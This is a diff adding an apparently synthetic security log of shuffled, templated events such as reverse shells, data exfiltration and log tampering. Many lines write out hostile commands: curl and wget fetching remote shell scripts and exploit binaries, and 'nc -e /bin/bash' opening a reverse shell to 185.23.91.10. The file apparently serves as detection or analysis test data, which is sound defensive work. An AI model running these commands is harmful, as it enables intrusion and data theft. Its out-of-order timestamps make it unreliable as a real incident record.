@@ -1,0 +1,500 @@
+2024-08-15 01:00:00 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:00:12 [INFO] Process started: /bin/bash
+2024-08-15 01:00:22 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:00:27 [INFO] Authenticated user: unknown from IP 192.168.1.38
+2024-08-15 01:00:32 [ERROR] Log tampering detected
+2024-08-15 01:01:40 [ERROR] Log tampering detected
+2024-08-15 01:01:00 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 01:02:20 [INFO] Command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:01:44 [INFO] Reverse shell connection initiated
+2024-08-15 01:01:03 [INFO] Authenticated user: jdoe from IP 192.168.1.22
+2024-08-15 01:03:00 [INFO] Command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:03:18 [INFO] Reverse shell connection initiated
+2024-08-15 01:01:12 [ERROR] Log tampering detected
+2024-08-15 01:02:36 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 01:01:52 [ERROR] Unauthorized access attempt on /tmp/tmpx837sh.sh
+2024-08-15 01:02:30 [INFO] File downloaded to /root/.bash_history
+2024-08-15 01:04:00 [WARN] Elevated privileges used on /root/.bash_history
+2024-08-15 01:05:06 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:01:48 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 01:03:10 [INFO] Reverse shell connection initiated
+2024-08-15 01:02:40 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 01:03:51 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:02:56 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:03:27 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 01:04:24 [INFO] Data transferred: 5.4MB to 8.8.8.8
+2024-08-15 01:05:50 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:02:36 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:06:18 [WARN] Suspicious command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:03:16 [INFO] File downloaded to /admin/internal/reporting
+2024-08-15 01:08:42 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:08:30 [INFO] File downloaded to /tmp/tmpx837sh.sh
+2024-08-15 01:05:41 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:05:20 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:02:45 [ERROR] Unauthorized access attempt on /home/admin/.ssh
+2024-08-15 01:04:32 [ERROR] Log tampering detected
+2024-08-15 01:08:45 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 01:11:24 [INFO] Reverse shell connection initiated
+2024-08-15 01:06:47 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:08:14 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:04:33 [ERROR] Log tampering detected
+2024-08-15 01:12:00 [INFO] System shutdown requested by admin
+2024-08-15 01:12:59 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:11:12 [INFO] Reverse shell connection initiated
+2024-08-15 01:11:28 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:13:12 [INFO] System shutdown requested by admin
+2024-08-15 01:11:15 [INFO] Process started: /bin/bash
+2024-08-15 01:08:26 [INFO] System shutdown requested by svc_logs
+2024-08-15 01:12:32 [INFO] System shutdown requested by unknown
+2024-08-15 01:04:00 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:05:43 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 01:05:00 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:13:36 [INFO] Authenticated user: admin from IP 192.168.1.22
+2024-08-15 01:13:00 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:15:01 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:05:24 [INFO] System shutdown requested by svc_logs
+2024-08-15 01:11:00 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 01:18:40 [INFO] Authenticated user: unknown from IP 192.168.1.46
+2024-08-15 01:11:24 [INFO] Authenticated user: svc_invoices from IP 192.168.1.41
+2024-08-15 01:12:34 [INFO] Authenticated user: unknown from IP 192.168.1.42
+2024-08-15 01:11:48 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:15:00 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:17:17 [INFO] Reverse shell connection initiated
+2024-08-15 01:08:16 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 01:15:45 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:16:00 [ERROR] Unauthorized access attempt on /home/admin/.ssh
+2024-08-15 01:08:40 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 01:14:18 [ERROR] Log tampering detected
+2024-08-15 01:18:59 [INFO] File downloaded to /home/admin/.ssh
+2024-08-15 01:15:52 [INFO] Reverse shell connection initiated
+2024-08-15 01:09:12 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:08:10 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 01:05:55 [INFO] System shutdown requested by jdoe
+2024-08-15 01:21:36 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:08:31 [INFO] System shutdown requested by svc_invoices
+2024-08-15 01:18:30 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:20:00 [INFO] Data transferred: 2.6MB to 10.10.1.3
+2024-08-15 01:20:16 [INFO] System shutdown requested by svc_logs
+2024-08-15 01:17:58 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:15:36 [INFO] Process started: /bin/bash
+2024-08-15 01:25:01 [INFO] File downloaded to /home/admin/.ssh
+2024-08-15 01:13:20 [WARN] Elevated privileges used on /home/admin/.ssh
+2024-08-15 01:18:54 [INFO] Authenticated user: svc_invoices from IP 192.168.1.33
+2024-08-15 01:08:12 [ERROR] Log tampering detected
+2024-08-15 01:12:27 [INFO] File downloaded to /root/.bash_history
+2024-08-15 01:25:12 [INFO] Reverse shell connection initiated
+2024-08-15 01:24:05 [WARN] Suspicious command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:10:02 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:11:36 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 01:22:00 [INFO] Data transferred: 4.0MB to 10.10.1.3
+2024-08-15 01:14:50 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 01:13:30 [ERROR] Log tampering detected
+2024-08-15 01:30:20 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:23:00 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 01:21:42 [INFO] System shutdown requested by admin
+2024-08-15 01:26:38 [INFO] Data transferred: 4.0MB to 10.10.1.3
+2024-08-15 01:20:35 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:09:36 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 01:08:05 [INFO] Process started: /bin/bash
+2024-08-15 01:29:24 [INFO] Reverse shell connection initiated
+2024-08-15 01:21:27 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:16:40 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 01:33:40 [INFO] Data transferred: 5.4MB to 203.0.113.50
+2024-08-15 01:23:48 [ERROR] Log tampering detected
+2024-08-15 01:30:54 [INFO] Reverse shell connection initiated
+2024-08-15 01:12:08 [INFO] File downloaded to /var/log/auth.log
+2024-08-15 01:33:15 [INFO] Data transferred: 3.6MB to 8.8.8.8
+2024-08-15 01:17:40 [INFO] File downloaded to /admin/internal/reporting
+2024-08-15 01:30:19 [INFO] Command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:36:00 [ERROR] Log tampering detected
+2024-08-15 01:16:21 [INFO] System shutdown requested by admin
+2024-08-15 01:29:20 [INFO] File downloaded to /var/log/auth.log
+2024-08-15 01:31:27 [INFO] Reverse shell connection initiated
+2024-08-15 01:14:56 [INFO] Process started: /bin/bash
+2024-08-15 01:11:18 [INFO] System shutdown requested by svc_logs
+2024-08-15 01:38:00 [INFO] System shutdown requested by jdoe
+2024-08-15 01:19:10 [INFO] Command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:34:48 [ERROR] Unauthorized access attempt on /tmp/tmpx837sh.sh
+2024-08-15 01:21:27 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 01:19:40 [INFO] Authenticated user: jdoe from IP 10.0.0.7
+2024-08-15 01:09:55 [INFO] Data transferred: 3.2MB to 10.10.1.3
+2024-08-15 01:28:00 [ERROR] Unauthorized access attempt on /tmp/tmpx837sh.sh
+2024-08-15 01:16:08 [INFO] Reverse shell connection initiated
+2024-08-15 01:36:36 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:10:15 [INFO] Data transferred: 4.9MB to 185.23.91.10
+2024-08-15 01:33:04 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 01:27:05 [INFO] Data transferred: 1.7MB to 8.8.8.8
+2024-08-15 01:14:42 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:40:13 [ERROR] Log tampering detected
+2024-08-15 01:42:40 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:15:03 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 01:36:50 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 01:15:17 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:26:24 [INFO] Data transferred: 4.8MB to 203.0.113.50
+2024-08-15 01:26:36 [WARN] Elevated privileges used on /home/admin/.ssh
+2024-08-15 01:17:52 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 01:15:45 [WARN] Suspicious command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:29:28 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:45:40 [INFO] File downloaded to /home/admin/.ssh
+2024-08-15 01:18:24 [INFO] System shutdown requested by jdoe
+2024-08-15 01:18:32 [INFO] System shutdown requested by admin
+2024-08-15 01:16:20 [ERROR] Log tampering detected
+2024-08-15 01:47:00 [WARN] Elevated privileges used on /root/.bash_history
+2024-08-15 01:11:50 [WARN] Suspicious command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:19:04 [INFO] Data transferred: 1.3MB to 203.0.113.50
+2024-08-15 01:31:12 [INFO] File downloaded to /admin/internal/reporting
+2024-08-15 01:29:00 [INFO] Reverse shell connection initiated
+2024-08-15 01:36:30 [INFO] File downloaded to /var/log/auth.log
+2024-08-15 01:24:30 [ERROR] Log tampering detected
+2024-08-15 01:27:08 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:14:54 [INFO] File downloaded to /home/admin/.ssh
+2024-08-15 01:12:30 [ERROR] Unauthorized access attempt on /tmp/tmpx837sh.sh
+2024-08-15 01:27:41 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 01:48:08 [INFO] Data transferred: 4.8MB to 185.23.91.10
+2024-08-15 01:17:51 [INFO] Process started: /usr/bin/curl
+2024-08-15 01:41:04 [INFO] System shutdown requested by admin
+2024-08-15 01:18:05 [ERROR] Log tampering detected
+2024-08-15 01:28:36 [ERROR] Log tampering detected
+2024-08-15 01:49:43 [INFO] Data transferred: 5.3MB to 8.8.8.8
+2024-08-15 01:50:02 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:13:15 [INFO] Authenticated user: admin from IP 192.168.1.42
+2024-08-15 01:40:00 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:18:47 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:13:30 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:16:18 [INFO] Authenticated user: svc_invoices from IP 10.0.0.6
+2024-08-15 01:41:00 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:38:30 [INFO] System shutdown requested by svc_logs
+2024-08-15 01:47:02 [INFO] Reverse shell connection initiated
+2024-08-15 01:22:16 [ERROR] Log tampering detected
+2024-08-15 01:25:12 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:33:48 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:56:40 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:45:36 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:51:36 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:28:50 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:49:18 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:35:00 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:55:44 [INFO] Authenticated user: jdoe from IP 192.168.1.37
+2024-08-15 01:47:12 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:56:22 [INFO] System shutdown requested by unknown
+2024-08-15 01:20:53 [ERROR] Log tampering detected
+2024-08-15 01:57:00 [INFO] File downloaded to /admin/internal/reporting
+2024-08-15 01:36:12 [WARN] Suspicious command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:15:10 [INFO] Data transferred: 1.5MB to 185.23.91.10
+2024-08-15 01:27:27 [INFO] Process started: /bin/bash
+2024-08-15 01:39:52 [INFO] Authenticated user: svc_logs from IP 185.23.91.13
+2024-08-15 01:58:35 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 01:34:06 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:28:03 [INFO] Command executed: bash /tmp/install.sh
+2024-08-15 01:56:24 [INFO] System shutdown requested by jdoe
+2024-08-15 01:28:21 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 01:15:50 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:57:18 [INFO] Reverse shell connection initiated
+2024-08-15 01:22:24 [INFO] Authenticated user: svc_invoices from IP 192.168.1.33
+2024-08-15 01:25:44 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 01:45:16 [INFO] System shutdown requested by jdoe
+2024-08-15 01:26:00 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:22:52 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:52:32 [ERROR] Unauthorized access attempt on /home/admin/.ssh
+2024-08-15 01:26:24 [INFO] Reverse shell connection initiated
+2024-08-15 01:43:07 [WARN] Suspicious command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:30:00 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 01:40:12 [INFO] Process started: /usr/bin/curl
+2024-08-15 01:40:24 [ERROR] Log tampering detected
+2024-08-15 02:04:17 [INFO] Reverse shell connection initiated
+2024-08-15 01:37:24 [INFO] Command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:51:15 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 01:51:30 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:41:24 [INFO] File downloaded to /tmp/tmpx837sh.sh
+2024-08-15 01:34:40 [INFO] Authenticated user: jdoe from IP 192.168.1.41
+2024-08-15 01:27:52 [ERROR] Log tampering detected
+2024-08-15 01:52:30 [INFO] File downloaded to /tmp/tmpx837sh.sh
+2024-08-15 01:56:16 [INFO] Data transferred: 5.0MB to 185.23.91.10
+2024-08-15 02:07:08 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 02:00:21 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:46:22 [ERROR] Log tampering detected
+2024-08-15 01:46:35 [ERROR] Log tampering detected
+2024-08-15 01:50:24 [INFO] Reverse shell connection initiated
+2024-08-15 01:18:05 [INFO] Authenticated user: svc_invoices from IP 192.168.1.22
+2024-08-15 01:50:52 [INFO] Reverse shell connection initiated
+2024-08-15 01:58:24 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 02:13:20 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:40:31 [INFO] Reverse shell connection initiated
+2024-08-15 02:06:36 [ERROR] Log tampering detected
+2024-08-15 01:37:10 [INFO] Data transferred: 5.5MB to 8.8.8.8
+2024-08-15 02:14:40 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 02:15:00 [INFO] Reverse shell connection initiated
+2024-08-15 01:33:54 [WARN] Elevated privileges used on /admin/internal/reporting
+2024-08-15 01:30:16 [ERROR] Log tampering detected
+2024-08-15 01:45:36 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 01:22:54 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:34:30 [INFO] System shutdown requested by admin
+2024-08-15 01:38:30 [INFO] System shutdown requested by svc_invoices
+2024-08-15 02:09:36 [INFO] Data transferred: 4.1MB to 203.0.113.50
+2024-08-15 01:23:18 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:35:06 [INFO] System shutdown requested by svc_invoices
+2024-08-15 01:19:35 [INFO] Authenticated user: jdoe from IP 192.168.1.21
+2024-08-15 01:43:16 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:51:21 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 02:11:24 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:35:51 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 02:08:00 [INFO] Data transferred: 3.3MB to 8.8.8.8
+2024-08-15 01:24:06 [INFO] Data transferred: 4.4MB to 185.23.91.10
+2024-08-15 01:36:18 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:16:57 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 02:01:00 [WARN] Elevated privileges used on /home/admin/.ssh
+2024-08-15 01:20:25 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:01:30 [WARN] Suspicious command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:53:31 [INFO] File downloaded to /var/log/auth.log
+2024-08-15 02:10:16 [WARN] Suspicious command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:58:06 [INFO] System shutdown requested by admin
+2024-08-15 02:15:00 [INFO] Reverse shell connection initiated
+2024-08-15 02:19:29 [INFO] Reverse shell connection initiated
+2024-08-15 01:29:24 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:20:07 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:59:16 [INFO] Data transferred: 4.0MB to 8.8.8.8
+2024-08-15 02:20:45 [ERROR] Log tampering detected
+2024-08-15 01:42:40 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 02:08:32 [INFO] Process started: /bin/bash
+2024-08-15 01:51:36 [ERROR] Log tampering detected
+2024-08-15 01:38:51 [ERROR] Log tampering detected
+2024-08-15 02:00:40 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 02:00:54 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:56:46 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 01:43:50 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:30:48 [INFO] Reverse shell connection initiated
+2024-08-15 01:39:45 [INFO] Authenticated user: svc_logs from IP 185.23.91.11
+2024-08-15 01:39:54 [INFO] Reverse shell connection initiated
+2024-08-15 02:06:45 [INFO] Process started: /usr/bin/curl
+2024-08-15 01:44:40 [INFO] Data transferred: 5.1MB to 8.8.8.8
+2024-08-15 01:44:50 [INFO] Process started: /usr/bin/curl
+2024-08-15 01:40:30 [INFO] Reverse shell connection initiated
+2024-08-15 01:22:35 [INFO] Authenticated user: jdoe from IP 192.168.1.45
+2024-08-15 02:30:40 [INFO] System shutdown requested by svc_logs
+2024-08-15 02:03:42 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:45:40 [INFO] Data transferred: 4.9MB to 10.10.1.3
+2024-08-15 02:17:55 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:41:24 [INFO] Authenticated user: svc_logs from IP 185.23.91.19
+2024-08-15 02:27:43 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:00:14 [INFO] Connection established to external IP 185.23.91.10
+2024-08-15 01:27:54 [INFO] Authenticated user: admin from IP 192.168.1.33
+2024-08-15 01:51:20 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 01:28:06 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 02:01:06 [INFO] Data transferred: 5.2MB to 185.23.91.10
+2024-08-15 02:34:20 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 02:11:00 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 02:11:15 [INFO] Command executed: /usr/bin/python3 exfil.py
+2024-08-15 02:16:16 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 02:21:19 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 02:07:12 [WARN] Elevated privileges used on /root/.bash_history
+2024-08-15 02:21:53 [INFO] Reverse shell connection initiated
+2024-08-15 01:33:50 [INFO] File downloaded to /root/.bash_history
+2024-08-15 02:17:36 [INFO] File downloaded to /root/.bash_history
+2024-08-15 02:08:08 [INFO] File downloaded to /var/log/auth.log
+2024-08-15 02:18:08 [WARN] Elevated privileges used on /admin/internal/reporting
+2024-08-15 02:23:18 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 02:18:40 [INFO] Process started: /usr/sbin/sshd
+2024-08-15 01:49:20 [INFO] System shutdown requested by svc_logs
+2024-08-15 01:54:27 [INFO] Authenticated user: admin from IP 185.23.91.18
+2024-08-15 02:14:30 [INFO] File downloaded to /root/.bash_history
+2024-08-15 02:19:44 [INFO] File downloaded to /home/admin/.ssh
+2024-08-15 02:20:00 [ERROR] Unauthorized access attempt on /tmp/tmpx837sh.sh
+2024-08-15 02:20:16 [INFO] File downloaded to /tmp/tmpx837sh.sh
+2024-08-15 02:00:24 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:25:51 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 01:40:32 [INFO] Data transferred: 3.5MB to 10.10.1.3
+2024-08-15 02:16:15 [INFO] File downloaded to /root/.bash_history
+2024-08-15 02:06:18 [INFO] System shutdown requested by unknown
+2024-08-15 01:56:17 [ERROR] Log tampering detected
+2024-08-15 02:27:16 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 02:37:51 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:46:30 [INFO] System shutdown requested by admin
+2024-08-15 01:41:28 [ERROR] Log tampering detected
+2024-08-15 01:26:00 [INFO] Command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:23:28 [INFO] Process started: /usr/bin/python3 exfil.py
+2024-08-15 01:52:20 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 02:08:15 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 02:13:44 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 01:52:50 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:08:54 [WARN] Elevated privileges used on /home/admin/.ssh
+2024-08-15 01:47:51 [INFO] Reverse shell connection initiated
+2024-08-15 02:14:40 [ERROR] Unauthorized access attempt on /admin/internal/reporting
+2024-08-15 02:47:00 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 02:09:46 [INFO] Data transferred: 3.4MB to 185.23.91.10
+2024-08-15 02:15:22 [INFO] Authenticated user: svc_invoices from IP 192.168.1.39
+2024-08-15 02:31:48 [INFO] Command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 02:37:30 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 02:32:22 [INFO] Reverse shell connection initiated
+2024-08-15 02:21:45 [INFO] System shutdown requested by svc_invoices
+2024-08-15 01:49:12 [INFO] Data transferred: 2.8MB to 185.23.91.10
+2024-08-15 02:11:17 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 01:27:30 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 02:00:41 [INFO] Authenticated user: unknown from IP 192.168.1.21
+2024-08-15 02:06:24 [INFO] Connection established to external IP 10.10.1.3
+2024-08-15 01:44:24 [ERROR] Log tampering detected
+2024-08-15 01:38:58 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 02:29:20 [INFO] Data transferred: 3.6MB to 10.10.1.3
+2024-08-15 02:24:00 [INFO] Data transferred: 3.7MB to 203.0.113.50
+2024-08-15 02:18:38 [ERROR] Unauthorized access attempt on /home/admin/.ssh
+2024-08-15 02:24:30 [INFO] System shutdown requested by svc_logs
+2024-08-15 01:39:33 [INFO] Authenticated user: jdoe from IP 10.0.0.3
+2024-08-15 02:53:20 [INFO] Data transferred: 5.5MB to 203.0.113.50
+2024-08-15 02:13:53 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 01:57:00 [WARN] Suspicious command executed: wget http://malicious.domain/exploit.bin
+2024-08-15 02:20:02 [INFO] Reverse shell connection initiated
+2024-08-15 02:54:40 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 01:34:30 [INFO] Data transferred: 4.2MB to 185.23.91.10
+2024-08-15 02:14:58 [INFO] Authenticated user: svc_logs from IP 192.168.1.37
+2024-08-15 02:32:32 [INFO] System shutdown requested by admin
+2024-08-15 01:52:12 [WARN] Elevated privileges used on /admin/internal/reporting
+2024-08-15 01:40:43 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 01:58:20 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 02:33:36 [ERROR] Unauthorized access attempt on /root/.bash_history
+2024-08-15 02:28:00 [WARN] Elevated privileges used on /home/admin/.ssh
+2024-08-15 01:52:57 [INFO] Process started: /usr/bin/curl
+2024-08-15 02:46:12 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 02:46:30 [INFO] Data transferred: 2.0MB to 203.0.113.50
+2024-08-15 02:46:48 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 01:59:30 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 02:35:28 [INFO] File downloaded to /root/.bash_history
+2024-08-15 02:17:47 [ERROR] Log tampering detected
+2024-08-15 02:48:00 [INFO] Process started: /usr/bin/curl
+2024-08-15 02:06:11 [INFO] Process started: /bin/bash
+2024-08-15 01:54:18 [INFO] Data transferred: 5.6MB to 203.0.113.50
+2024-08-15 02:36:48 [WARN] Elevated privileges used on /tmp/tmpx837sh.sh
+2024-08-15 02:31:00 [INFO] File downloaded to /home/admin/.ssh
+2024-08-15 02:25:10 [INFO] Reverse shell connection initiated
+2024-08-15 02:43:42 [INFO] System shutdown requested by svc_invoices
+2024-08-15 01:48:56 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 01:36:48 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 01:55:21 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 02:14:00 [INFO] Authenticated user: jdoe from IP 192.168.1.43
+2024-08-15 01:30:55 [INFO] Process started: /usr/bin/curl
+2024-08-15 02:57:48 [INFO] Process started: /bin/bash
+2024-08-15 02:45:41 [INFO] File downloaded to /tmp/tmpx837sh.sh
+2024-08-15 02:52:12 [INFO] System shutdown requested by unknown
+2024-08-15 02:40:00 [INFO] Connection established to external IP 203.0.113.50
+2024-08-15 02:08:56 [INFO] File downloaded to /admin/internal/reporting
+2024-08-15 01:37:42 [ERROR] Log tampering detected
+2024-08-15 02:15:36 [INFO] Reverse shell connection initiated
+2024-08-15 02:34:45 [INFO] File downloaded to /var/log/auth.log
+2024-08-15 02:47:40 [WARN] Suspicious command executed: curl http://185.23.91.10:8080/shell.sh
+2024-08-15 01:57:09 [INFO] Data transferred: 1.7MB to 185.23.91.10
+2024-08-15 01:31:50 [INFO] File downloaded to /root/.bash_history
+2024-08-15 02:35:45 [INFO] Process started: /bin/bash
+2024-08-15 03:01:36 [WARN] Suspicious command executed: /usr/bin/python3 exfil.py
+2024-08-15 02:17:00 [WARN] Suspicious command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 01:45:02 [INFO] Reverse shell connection initiated
+2024-08-15 01:58:03 [WARN] Suspicious command executed: bash /tmp/install.sh
+2024-08-15 02:43:28 [INFO] Connection established to external IP 8.8.8.8
+2024-08-15 02:24:17 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 02:18:00 [INFO] System shutdown requested by jdoe
+2024-08-15 01:58:39 [ERROR] Unauthorized access attempt on /var/log/auth.log
+2024-08-15 03:10:40 [INFO] Reverse shell connection initiated
+2024-08-15 02:25:09 [INFO] Process started: /usr/bin/curl
+2024-08-15 01:52:32 [INFO] Command executed: nc -e /bin/bash 185.23.91.10 443
+2024-08-15 02:25:35 [INFO] Authenticated user: svc_logs from IP 192.168.1.26
+2024-08-15 02:39:00 [WARN] Elevated privileges used on /var/log/auth.log
+2024-08-15 01:46:19 [INFO] Authenticated user: unknown from IP 185.23.91.19
+2024-08-15 02:39:30 [INFO] System shutdown requested by svc_logs
